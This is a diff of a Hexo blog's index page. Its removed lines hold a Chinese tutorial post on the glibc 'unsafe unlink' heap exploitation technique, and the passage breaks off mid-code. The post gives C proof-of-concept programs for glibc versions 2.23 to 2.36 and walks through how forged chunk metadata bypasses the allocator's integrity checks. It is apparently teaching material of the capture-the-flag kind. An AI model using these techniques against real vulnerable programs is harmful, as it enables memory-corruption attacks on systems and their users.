@@ -1,297 +1,257 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
   
+  <meta name="generator" content="Hexo 7.3.0">
+
   
+
+  
+
+  
+    <meta name="author" content="xsh">
+  
+
+  
+
+  
+
   <title>xsh 的世界</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="xsh 的世界">
-<meta property="og:url" content="http://example.com/index.html">
-<meta property="og:site_name" content="xsh 的世界">
-<meta property="og:locale" content="en_US">
-<meta property="article:author" content="xsh">
-<meta name="twitter:card" content="summary">
+
   
-    <link rel="alternate" href="/atom.xml" title="xsh 的世界" type="application/atom+xml">
+
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+
+  <!--mathjax latex数学公式显示支持-->
   
   
-    <link rel="shortcut icon" href="/favicon.png">
+
   
+
   
+
   
 <link rel="stylesheet" href="/css/style.css">
 
-  
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
-
-  
-  
-<meta name="generator" content="Hexo 7.3.0"></head>
-
+</head>
 <body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">xsh 的世界</a>
-      </h1>
-      
+  <div class="root-container">
+    
+<!-- header container -->
+<header class="header-container">
+  
+    <div class="post-image" style="background-image: url(https://qiniu.sukoshi.xyz/src/images/68686407_p0.jpg)"></div>
+  
+
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/">
+        
+          xsh 的世界
+        
+      </a>
     </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-        
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
       </div>
-    </div>
-  </div>
-</header>
-
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-test-bolg" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/07/13/test-bolg/" class="article-date">
-  <time class="dt-published" datetime="2024-07-13T10:23:23.000Z" itemprop="datePublished">2024-07-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+      <ul class="navbar-list">
         
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/07/13/test-bolg/">test bolg</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><img src="/2024/07/13/test-bolg/0030168d93298d4ff97ad3cdd8757d36.png"></p>
-<p>测试博客<img src="/2024/07/13/test-bolg/1308265773_233027cbd1e271924f052fd455f533b0.jpg"></p>
-<p><img src="/2024/07/13/test-bolg/ee68ea1fa0b9956f35ed3346382001b69c14c1358c18c1a7a.jpg"></p>
-<h2 id="unsafe-unlink-end"><a href="#unsafe-unlink-end" class="headerlink" title="unsafe unlink(end)"></a>unsafe unlink(end)</h2><h4 id="适用范围："><a href="#适用范围：" class="headerlink" title="适用范围："></a>适用范围：</h4><p>​	2.23 ~ 至今</p>
-<h4 id="攻击方法："><a href="#攻击方法：" class="headerlink" title="攻击方法："></a>攻击方法：</h4><p>​	当知道堆块指针存放的地址（ptr）时候（如未开启 PIE 或者已泄露 pro_base），如果能够通过 （堆溢出、off by one、off by null） 溢出写一个 \x00 ，那么，就可以修改相邻下一个 chunk 的 prev size 和 size 的 p 位，接下来通过 free 该 chunk 触发向后合并，来触发 unlink，使堆块指针存放的地址（ptr）处被修改为 ptr - 0x18</p>
-<p>​	在堆题普遍开启了 PIE 的情况下，unlink 攻击的难点在于获取存放堆块指针的地址</p>
-<h4 id="2-23-2-24："><a href="#2-23-2-24：" class="headerlink" title="2.23 ~ 2.24："></a>2.23 ~ 2.24：</h4><h5 id="利用-Poc："><a href="#利用-Poc：" class="headerlink" title="利用 Poc："></a>利用 Poc：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> malloc_size = <span class="number">0x80</span>;</span><br><span class="line">	<span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line">	# 申请一个 <span class="number">0x80</span> 大小的 chunk，堆块指针存放在 bss 上</span><br><span class="line">	chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">    # 申请一个 <span class="number">0x80</span> 大小的 chunk</span><br><span class="line">	<span class="type">uint64_t</span> *chunk1_ptr  = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">	# 伪造 fd = ptr - <span class="number">0x18</span> / bk = ptr - <span class="number">0x10</span></span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    # 伪造相邻下一个 chunk 的 prev size 和 size 的 p 位</span><br><span class="line">	<span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line">	</span><br><span class="line">    # 触发向后合并，调用 unlink 函数</span><br><span class="line">    # chunk0_ptr = &amp;chunk0_ptr - <span class="number">0x18</span></span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">    # 修改 chunk0_ptr = &amp;victim_string</span><br><span class="line">	<span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string, <span class="string">&quot;Hello!~&quot;</span>);    </span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">    # 修改 victim_string = <span class="number">0x4141414142424242</span>LL</span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line">	<span class="comment">// sanity check</span></span><br><span class="line">	assert(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>这是 _int_free 函数中触发向后合并的代码</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">	# 如果当前释放堆块的 p 位是 <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      # 进行向后合并</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      # 根据 prev size 来寻找当前释放堆块的上一个相邻堆块的地址</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      # 进行 unlink 操作</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>其中 unlink 是一个宏定义</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    FD = P-&gt;fd;								      </span><br><span class="line">    BK = P-&gt;bk;								      </span><br><span class="line">    # 检查双向链表的完整性，确保没被篡改</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      </span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        # 修改 fd 和 bk 使 chunk 从链表中取出</span><br><span class="line">        FD-&gt;bk = BK;							      </span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line"> 		# 如果 <span class="built_in">free</span> chunk 属于 small bins 并且 fd_nextsize 不为空，则进行 fd_nextsize 和 bk_nextsize 的更新操作</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)				      </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">       		<span class="comment">/***/</span></span><br><span class="line">              &#125;								      </span><br><span class="line">      &#125;								      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>通过阅读上面的代码，我们可以知道，当执行到</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlink(av, P, bck, fwd);</span><br></pre></td></tr></table></figure>
-
-<p>时候，由于 p &#x3D; chunk_at_offset(p, -((long) prevsize)); ，其中 p 已经指向我们在 chunk0 中伪造的 fake_chunk 了</p>
-<p>进入 unlink 后，此时可以知道</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p = &amp;fake_chunk_head</span><br><span class="line">chunk0_ptr = &amp;chunk0_user_data = &amp;fake_chunk_head = P</span><br><span class="line"></span><br><span class="line">FD = P -&gt; fd = &amp;chunk0_ptr - 0x18</span><br><span class="line">BK = P -&gt; bk = &amp;chunk0_ptr - 0x10</span><br></pre></td></tr></table></figure>
-
-<p>因此</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD -&gt; bk = *(&amp;chunk0_ptr - 0x18) -&gt; bk = *(&amp;chunk0_ptr - 0x18 + 0x18) = *(&amp;chunk0_ptr) = chunk0_ptr = P</span><br><span class="line">BK -&gt; fd = *(&amp;chunk0_ptr - 0x10) -&gt; fd = *(&amp;chunk0_ptr - 0x10 + 0x10) = &amp;(&amp;chunk0_ptr) = chunk0_ptr = P</span><br></pre></td></tr></table></figure>
-
-<p>那么就能够绕过</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 检查双向链表的完整性，确保没被篡改</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      </span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br></pre></td></tr></table></figure>
-
-<p>之后，由于要从 unsorted bins 的双向链表中取出 fake chunk，那么</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 修改 fd 和 bk 使 chunk 从链表中取出</span><br><span class="line">      	FD-&gt;bk = BK;							      </span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">FD -&gt; bk = P = chunk0_ptr / BK = &amp;chunk0_ptr - <span class="number">0x10</span></span><br><span class="line">BK -&gt; fd = P = chunk0_ptr / FD = &amp;chunk0_ptr - <span class="number">0x18</span></span><br></pre></td></tr></table></figure>
-
-<p>那么，最后</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># chunk0_ptr 被修改两次</span><br><span class="line">chunk0_ptr = &amp;chunk0_ptr - <span class="number">0x10</span></span><br><span class="line">chunk0_ptr = &amp;chunk0_ptr - <span class="number">0x18</span></span><br></pre></td></tr></table></figure>
-
-<p>也就是能够实现在 ptr 处写入 &amp;ptr - 0x18 的攻击效果</p>
-<h4 id="2-27："><a href="#2-27：" class="headerlink" title="2.27："></a>2.27：</h4><h5 id="利用Poc"><a href="#利用Poc" class="headerlink" title="利用Poc:"></a>利用Poc:</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> malloc_size = <span class="number">0x420</span>; <span class="comment">//we want to be big enough not to use tcache or fastbin</span></span><br><span class="line">	<span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="type">uint64_t</span> *chunk1_ptr  = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"></span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	</span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// sanity check</span></span><br><span class="line">	assert(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>与 2.23 对比，由于 tcache bins 的加入，所以调整了申请的 chunk 的大小，好直接放入 unsorted bins</p>
-<p>在实战中，倘若堆块申请的大小有限制，一般先把 tcache bins 填满</p>
-<h5 id="漏洞原理：-1"><a href="#漏洞原理：-1" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>与 2.23 相比一样，但是在 2.26 之后，包括 2.27 中的 unlink 宏定义增加了一个检测</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);			      </span><br><span class="line">    FD = P-&gt;fd;								      </span><br><span class="line">    BK = P-&gt;bk;</span><br><span class="line">	<span class="comment">/***/</span></span><br></pre></td></tr></table></figure>
-
-<p>这里主要是为了检测下一个堆块的 prev size 和当前堆块的 size 是否相同</p>
-<p>这里有两个绕过方法，一是修改 fake chunk 的 size 与下一个堆块的 prev size 相同，二是像 Poc 那样不去修改令其为 0（fake chunk 的prev size 也需为 0 ）</p>
-<p>第一个方法会比较好理解，第二个方法原理如下</p>
-<p>其中 next_chunk 也是一个宏定义</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))</span></span><br></pre></td></tr></table></figure>
-
-<p>而 p 指向了 fake chunk，fake chunk 的 size 为 0</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunksize(p) = <span class="number">0</span></span><br><span class="line">prev_size (next_chunk(P)) = prev_size(P) = <span class="number">0</span></span><br></pre></td></tr></table></figure>
-
-<p>这样，如果 fake chunk 的 prev size 和 size 相等都为 0 ，也是可以绕过这个检测的</p>
-<h4 id="2-31-2-36："><a href="#2-31-2-36：" class="headerlink" title="2.31 ~ 2.36："></a>2.31 ~ 2.36：</h4><h5 id="利用-Poc：-1"><a href="#利用-Poc：-1" class="headerlink" title="利用 Poc："></a>利用 Poc：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="type">int</span> malloc_size = <span class="number">0x420</span>; <span class="comment">//we want to be big enough not to use tcache or fastbin</span></span><br><span class="line">	<span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="type">uint64_t</span> *chunk1_ptr  = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">	# 伪造 fake chunk 的 size</span><br><span class="line">	chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line"></span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line"></span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// sanity check</span></span><br><span class="line">	assert(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h5 id="漏洞原理：-2"><a href="#漏洞原理：-2" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>在 2.31 之后，__int_free 函数中对于向后合并的代码迎来了较大改动</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      # 检测当前堆块的 size 是否和 prevsize 相等</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>而 unlink 也从宏定义转变成了 unlink_chunk 函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span><br><span class="line">&#123;</span><br><span class="line">  # 检测当前堆块的 size 和 相邻下一个堆块的 prev size 是否相等</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line">  # 检测链表完整性</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line">  # 修改 fd 和 bk 使 chunk 从链表中取出</span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  # 如果 <span class="built_in">free</span> chunk 属于 small bins 并且 fd_nextsize 不为空，则进行 fd_nextsize 和 bk_nextsize 的更新操作</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span 